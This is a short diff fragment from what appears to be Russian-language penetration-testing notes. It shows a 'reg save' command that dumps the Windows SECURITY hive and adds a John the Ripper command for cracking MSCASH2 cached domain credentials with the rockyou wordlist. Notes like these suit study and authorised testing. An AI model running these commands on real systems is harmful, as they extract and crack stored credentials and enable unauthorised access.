@@ -38,6 +38,9 @@ reg save hklm\security c:\security
 
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
+и пытаемся крякнуть мскеш2
+
+john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash
 
 
 
